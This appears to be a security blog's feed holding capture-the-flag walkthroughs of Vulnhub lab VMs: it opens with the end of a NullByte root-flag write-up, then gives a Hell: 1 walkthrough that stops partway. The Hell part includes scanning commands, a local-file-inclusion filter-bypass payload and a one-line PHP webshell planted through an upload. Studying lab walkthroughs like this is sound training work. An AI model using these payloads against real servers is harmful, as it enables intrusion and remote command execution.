
<p>Then run the program <code>procwatch</code> to get ROOT:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -l&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root root 1170 Aug  2 01:45 proof.txt</span></code></pre></td></tr></table></div></figure></p>

<p>Catch the flag <code>proof.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat proof.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>adf11c7a9e6523e630aaf3b9b7acb51d&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>It seems that you have pwned the box, congrats.
</span><span class='line'>Now you done that I wanna talk with you. Write a walk &amp; mail at
</span><span class='line'>&lt;a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#120;&#108;&#x79;&#48;&#x6e;&#x40;&#115;&#x69;&#x67;&#97;&#x69;&#110;&#x74;&#x2e;&#x6f;&#114;&#103;">&#120;&#x6c;&#x79;&#x30;&#110;&#64;&#115;&#x69;&#x67;&#x61;&#x69;&#110;&#x74;&#46;&#111;&#x72;&#x67;&lt;/a> attach the walk and proof.txt
</span><span class='line'>If sigaint.org is down you may mail at &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#110;&#x62;&#x73;&#x6c;&#x79;&#x30;&#110;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#110;&#x62;&#x73;&#108;&#x79;&#48;&#x6e;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>USE THIS PGP PUBLIC KEY&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash;&ndash;BEGIN PGP PUBLIC KEY BLOCK&mdash;&ndash;
</span><span class='line'>Version: BCPG C# v1.6.1.0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
</span><span class='line'>Gms=
</span><span class='line'>=PiAQ
</span><span class='line'>&mdash;&ndash;END PGP PUBLIC KEY BLOCK&mdash;&ndash;</span></code></pre></td></tr></table></div></figure></p>

<p>Done and cheers Ly0n!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Hell: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1/"/>
    <updated>2015-07-17T00:01:30-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>

<p>A few of the skills needed can be seen in some posts on <a href="http://netsec.ws.">http://netsec.ws.</a> Otherwise enjoy the experience - remember that although vulnerabilities might not jump out at you straight away you may need to try some variations on the normal to get past the protections in place!&ldquo; &ndash; <a href="http://netsec.ws/">Peleus</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/hell-1,95/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Hell (<em>10.10.10.146/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Include vulnerability existed in one of cookie variable</li>
<li>File upload function without any content filter will save any evil code into pre-defined file &lsquo;note.txt&rsquo; under folder &lsquo;/tmp/&rsquo;</li>
<li>Sensitive information found in &lsquo;login.php&rsquo; which disclose jack&rsquo;s SSH password and Database password</li>
<li>Use jack&rsquo;s PGP private key file to unlock the encrypted email file and found SSH password for another account &lsquo;milk_4_life&rsquo;</li>
<li>&lsquo;game&rsquo; program has sticky bit set and will call another program &lsquo;chmod&rsquo; when user win the game, but it has not been using absolute path for &lsquo;chmod&rsquo;</li>
<li>&lsquo;Rockyou&rsquo; dictionary based brute force attacking and cracked the password for &lsquo;Truecrypt&rsquo; container file found in george&rsquo;s home folder, found SSH private key file for another account &lsquo;bazza&rsquo;</li>
<li>Very similar vulnerability as in &lsquo;game&rsquo; happened in another program &lsquo;part2&rsquo; which can be expolited to privilege escape to &lsquo;oj&rsquo;</li>
<li>&lsquo;echo&rsquo; program has Format String vulnerability which should be able to be exploited to get ROOT</li>
<li>&lsquo;Truecrypt&rsquo; has vulnerability which can make attacker to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>, <font color="FF8000">burp proxy</font>]</li>
<li>brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Local file including vulnerability detect and exploit [<font color="FF8000">curl</font>]</li>
<li>Truecrypt password brute force attacking [<font color="FF8000">truecrack</font>]</li>
<li>Analysis and write script to win &lsquo;game&rsquo; program [<font color="FF8000">python</font>]</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get privilege escalation</li>
<li>Make evil truecrypt file to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burpsuite</a></li>
<li><a href="http://curl.haxx.se/">curl</a></li>
<li><a href="https://code.google.com/p/truecrack/">truecrack</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>netdiscover</code> as routine to detect the target&rsquo;s IP address (10.10.10.146 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 10.10.10.0/24&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> Currently scanning: Finished!   |   Screen View: Unique Hosts&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;h2>   IP            At MAC Address      Count  Len   MAC Vendor                   &lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p> 10.10.10.1      00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.2      00:50:56:e2:f9:10    01    060   VMWare, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.146    00:0c:29:e2:78:6f    01    060   VMware, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.254    00:50:56:fb:67:d4    01    060   VMWare, Inc. &lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>10.10.10.146 is our Target!</p>

<p>Next, run <code>nmap</code> to scan open services on the target.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -O -A -p- -T5 10.10.10.146&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-07-13 08:24 EDT
</span><span class='line'>Nmap scan report for 10-10-10-146.tpgi.com.au (10.10.10.146)
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT      STATE    SERVICE VERSION
</span><span class='line'>22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
</span><span class='line'>|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
</span><span class='line'>|&lt;em>  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
</span><span class='line'>80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
</span><span class='line'>|&lt;/em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>| http-robots.txt: 2 disallowed entries
</span><span class='line'>|&lt;em>/personal/ /super_secret_login_path_muhahaha/
</span><span class='line'>|&lt;/em>http-title: Have fun!
</span><span class='line'>111/tcp   open     rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          44490/tcp  status
</span><span class='line'>|_  100024  1          52715/udp  status
</span><span class='line'>666/tcp   open     doom?
</span><span class='line'>1337/tcp  filtered waste
</span><span class='line'>44490/tcp open     status  1 (RPC #100024)
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>ports 22 and 80 open, and two very interesting folders found on port 80: <code>\personal</code> and <code>\super_secret_login_path_muhahaha\</code>. Then using <code>wfuzz</code> to reveal more possible hidden folders and files:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wfuzz -c &ndash;hc 404 -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt &lt;a href="http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php">http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Wfuzz  2.0 - The Web Bruteforcer                     *&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>Target: &lt;a href="http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php">http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php&lt;/a>
</span><span class='line'>Payload type: file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Total requests: 81643&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ID  Response   Lines      Word         Chars          Request    &lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>00001:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00002:  C=200     17 L        33 W      371 Ch    &ldquo; - # directory-list-lowercase-2.3-small.txt&rdquo;
</span><span class='line'>00003:  C=200     17 L        33 W      371 Ch    &ldquo; - # Copyright 2007 James Fisher&rdquo;
</span><span class='line'>00004:  C=200     17 L        33 W      371 Ch    &ldquo;on-Share Alike 3.0 License. To view a copy of this&rdquo;
</span><span class='line'>00005:  C=200     17 L        33 W      371 Ch    &ldquo;# This work is licensed under the Creative Commons&rdquo;
</span><span class='line'>00006:  C=200     17 L        33 W      371 Ch    &ldquo;sit &lt;a href="http://creativecommons.org/licenses/by-sa/3.0/">http://creativecommons.org/licenses/by-sa/3.0/&lt;/a>&rdquo;
</span><span class='line'>00007:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00008:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00009:  C=200     17 L        33 W      371 Ch    &ldquo; Suite 300, San Francisco, California, 94105, USA.&rdquo;
</span><span class='line'>00010:  C=200     17 L        33 W      371 Ch    &ldquo;ed case insensative list, where entries were found&rdquo;
</span><span class='line'>00011:  C=200     17 L        33 W      371 Ch    &ldquo; - # on atleast 3 different hosts&rdquo;
</span><span class='line'>00012:  C=200     17 L        33 W      371 Ch    &ldquo;d a letter to Creative Commons, 171 Second Street,&rdquo;
</span><span class='line'>00016:  C=403     10 L        30 W      317 Ch    &ldquo; - &rdquo;
</span><span class='line'>00017:  C=200     17 L        33 W      371 Ch    &ldquo; - index&rdquo;
</span><span class='line'>00028:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00063:  C=302      0 L         0 W        0 Ch    &ldquo; - login&rdquo;
</span><span class='line'>00193:  C=200      5 L        19 W      163 Ch    &ldquo; - mail&rdquo;
</span><span class='line'>00198:  C=200      2 L         2 W       19 Ch    &ldquo; - users&rdquo;
</span><span class='line'>00470:  C=302     17 L        35 W      387 Ch    &ldquo; - personal&rdquo;
</span><span class='line'>00572:  C=200      7 L        21 W      170 Ch    &ldquo; - server&rdquo;
</span><span class='line'>01051:  C=200      5 L        20 W      179 Ch    &ldquo; - notes&rdquo;
</span><span class='line'>01255:  C=302      1 L         0 W        2 Ch    &ldquo; - check&rdquo;
</span><span class='line'>05186:  C=302     21 L        38 W      566 Ch    &ldquo; - panel&rdquo;
</span><span class='line'>Stopping&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>After I checked those revealed files, I found three interesting ones: <code>1.php</code>, <code>check.php</code> and <code>notes.php</code>.</p>

<p>Having a look at <code>1.php</code>, there is only one sentence: <font color="red">INTRUDER ALERT!</font> which is in Red color and all Capital.</p>

<p>By playing <code>check.php</code> with Burp proxy, I noticed that if user input wrong username/password, the cookie variable <code>failcount</code> will increase. However when input the wrong username/password more than 3 times, a new cookie <code>intruder</code> will be added and the value is always 1.</p>

<p>Also the <code>check.php</code> will request <code>personal.php</code> and <code>panel.php</code> as well, something noticeable in <code>panel.php</code> is that the red color alert: <font color="red">INTRUDER ALERT!</font> which is same as the content of <code>1.php</code>.</p>

<p>So based on the above facts and analysis, I could guess that the <code>panel.php</code> has included the <code>1.php</code> when user input wrong username/password over 3 times. As a result, I firstly modified the cookie value of <code>intruder</code> to <code>../../../../etc/passwd</code> but the respond is not excepted&hellip; might be the admin set a filter here or something like that. After I read the page in OWASP testing <a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)">guide</a>, I finally found a well-working payload: <code>....//....//....//....//....//....//etc//passwd</code>.</p>

<p><img class="left" src="/downloads/Hell1/1.png"></p>

<p>Here is a Local File Include vulnerability found.</p>

<p>Now it&rsquo;s time to move to <code>notes.php</code>.</p>

<p>Taking a close look at notes.php, I noticed that we can write anything and it will be saved in temporary folder(mostly possible is /tmp/ in Linux) as the name is <code>note.txt</code>.</p>

<p><img class="left" src="/downloads/Hell1/2.png"></p>

<p>After some trying, it is proved that the <code>note.txt</code> file is saved in <code>/tmp/</code> folder.</p>

<p>Then I wrote one-line PHP webshell to note.txt, then use File Include vulnerability found previously to include the webshell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">cmd</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Hell1/3.png"></p>

<p>Now I have already got a webshell and can run system command which is ready to poke around on the server file system.</p>

<p>In order to make the life easier, I use <code>curl</code> instead of burp proxy to interactive with target server.</p>

<p>First to request <code>check.php</code>, we can see that cookies <code>PHPSESSID</code> and <code>failcount</code> have been set.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl -v -L <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/check.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/check.php<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146<span class="ni">&amp;hellip;</span>
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;blockquote&gt;&lt;p&gt;</span>GET /super_secret_login_path_muhahaha/check.php HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;ul&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>additional stuff not fine transfer.c:1037: 0 0<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="ni">&amp;lt;</span> HTTP/1.1 302 Found
</span><span class='line'><span class="ni">&amp;lt;</span> Date: Wed, 15 Jul 2015 00:06:37 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Server: Apache/2.2.22 (Debian)
</span><span class='line'><span class="ni">&amp;lt;</span> X-Powered-By: PHP/5.4.4-14+deb7u11<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Added cookie PHPSESSID=<span class="ni">&amp;ldquo;</span>cb11eurq57no9kbu8k09pvt0d5<span class="ni">&amp;rdquo;</span> for domain 10.10.10.146, path /, expire 0
</span><span class='line'><span class="ni">&amp;lt;</span> Set-Cookie: PHPSESSID=cb11eurq57no9kbu8k09pvt0d5; path=/
</span><span class='line'><span class="ni">&amp;lt;</span> Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
</span><span class='line'><span class="ni">&amp;lt;</span> Pragma: no-cache
</span><span class='line'><span class="ni">&amp;lt;</span> Location: personal.php<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Added cookie failcount=<span class="ni">&amp;ldquo;</span>1<span class="ni">&amp;rdquo;</span> for domain 10.10.10.146, path /super_secret_login_path_muhahaha/, expire 0
</span><span class='line'><span class="ni">&amp;lt;</span> Set-Cookie: failcount=1
</span><span class='line'><span class="ni">&amp;lt;</span> Vary: Accept-Encoding
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Length: 2
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Type: text/html
</span><span class='line'><span class="ni">&amp;lt;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Ignoring the response-body<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Connection #0 to host 10.10.10.146 left intact<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Issue another request to this URL: <span class="ni">&amp;lsquo;</span><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/personal.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/personal.php<span class="nt">&lt;/a&gt;</span><span class="ni">&amp;rsquo;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Re-using existing connection! (#0) with host (nil)<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Connected to (nil) (10.10.10.146) port 80 (#0)
</span><span class='line'>GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>
</span><span class='line'>Cookie: failcount=1; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;/ul&gt;</span>
</span><span class='line'><span class="nt">&lt;/blockquote&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>root@kali:~/hell# cat cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>Netscape HTTP Cookie File<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://curl.haxx.se/rfc/cookie_spec.html&quot;</span><span class="nt">&gt;</span>http://curl.haxx.se/rfc/cookie_spec.html<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>This file was generated by libcurl! Edit at your own risk.<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   1
</span></code></pre></td></tr></table></div></figure></p>

<p>New cookie &ldquo;intruder&rdquo; has been set after running the same command 3 times.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
